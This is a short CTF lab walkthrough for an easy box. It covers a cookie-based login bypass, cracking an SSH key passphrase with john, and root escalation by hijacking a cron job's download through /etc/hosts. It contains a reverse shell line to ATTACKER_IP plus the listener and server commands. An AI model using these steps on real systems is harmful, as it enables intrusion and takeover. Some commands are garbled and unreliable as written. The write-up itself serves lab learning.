- - - 
created : 17-07-2025 

Tags : #easy  
- - - 
# Objective

It's a [[CTF]] so we catch them all.

# Recon
## Nmap

We can use [[Nmap]] to scan the target :

```
    22/tcp open ssh
    80/tcp open http
```

# Enumeration
## Gobuster

Now we can use [[Gobuster]] to start [[Enumeration]] :

```
    /admin
    /aboutus
```

visiting the /admin directory we find the login page for admins and in the /aboutus we find some names

- Ninja - Lead Developer
- Pars - Shibe Enthusiast and Emotional Support Animal Manager
- Szymex - Head Of Security
- Bee - Chief Drinking Water Coordinator
- MuirlandOracle - Cryptography Consultant

then we can look at the download of the Source code (go), we find another name (Steve) but nothing interesting

about, what is interesting here is the request for the name of the **login Cookie.**

# Exploit

For the [[Exploit]] we have to Bypass login [[Cookies]] and we see in the [[Source Code]] that we need to modify the parameter name=SessionToken to bypass login credentials access, we can do it from our [[Developer tools]] on browser and just set the cookie name to \*\*==SessionToken==\*\* reloading the page we have access and find the **id_rca** of James.

## Ssh2John

we can use [[Ssh2john]] `ssh2john id_rsa > jamhash` and `john jamhash --wordlist=/usr/share/wordlists/rockyou.txt`  and find <span style="color: rgb(45, 194, 107);">james13</span>

## SSH

we need to make the  [[SSH]] key executable :  `chmod 600 id_rsa` than we can `ssh james id_rsa p: james13`  and `cat user.txt`

# Privilege Escalation

For the [[Privilege Escalation]] we  `cat etc/crontab`  and we find **buildscript.sh** [[Bash]] but cant modify it, we’ll need to find a way to put in some custom code to run as root .

we can `cat etc/hosts` and we can edit overpass.thm pointing to our[[IP address]] using [[Nano]] 

## Create the BuildScript  

```
              mkdir -p downloads/src in attacker machine ;
              cd downloads/src ;
              bash -i >& /dev/tcp/(ATTACKER_IP)/8080 0>&1  
              chmod +x buildscript.sh
```

then we create a [[Server]] : `python3 -m http.server 80`  and open listener : `nc -lvpn 8080`

we will wait until it runs our script and then we’ll gain root access where we can find the flag as the root user in the root.txt file.